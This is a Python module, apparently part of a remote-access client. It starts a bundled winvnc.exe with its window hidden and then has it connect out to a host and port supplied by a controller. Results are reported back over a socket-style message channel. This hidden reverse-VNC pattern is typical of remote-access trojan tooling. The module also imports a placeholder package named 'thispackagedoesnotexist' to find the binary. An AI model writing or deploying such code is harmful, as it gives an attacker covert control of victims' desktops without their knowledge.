import psutil
import subprocess
import time
import os
import thispackagedoesnotexist

def find_process_by_exe(file_name):
    try:
        for proc in psutil.process_iter(['pid', 'exe']):
            if proc.info['exe'] and file_name.lower() in proc.info['exe'].lower():
                return proc.info['pid']
    except (psutil.AccessDenied, psutil.NoSuchProcess):
        pass
    return None

def start_client_desktop(client, data, HOST, converter):
    try:
        port = data.get("port")
        if not port:
            raise ValueError("Port not provided in data")

        client_pid = find_process_by_exe("winvnc.exe")

        parent_dir = os.path.dirname(thispackagedoesnotexist.__file__)
        program_path = os.path.join(parent_dir, "files", "vnc", "winvnc.exe")

        if not os.path.exists(program_path):
            raise FileNotFoundError(f"The path {program_path} does not exist")
        
        if not client_pid:
            try:
                subprocess.Popen(
                    [program_path],
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                time.sleep(5)
            except Exception as e:
                raise RuntimeError(f"Failed to start winvnc.exe: {e}")

        client_pid = find_process_by_exe("winvnc.exe")
        if client_pid:
            try:
                command = [program_path, "-connect", f"{HOST}:{port}"]
                subprocess.Popen(command, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                message = "From Client: Client Desktop Started"
            except Exception as e:
                client.emit('message', converter.encode({"client_desktop_logger": str(e)}))
                return
        else:
            message = "From Client: winvnc.exe process not found after starting"
        
        client.emit('message', converter.encode({"client_desktop": message}))

    except Exception as e:
        client.emit('message', converter.encode({"client_desktop_logger": str(e)}))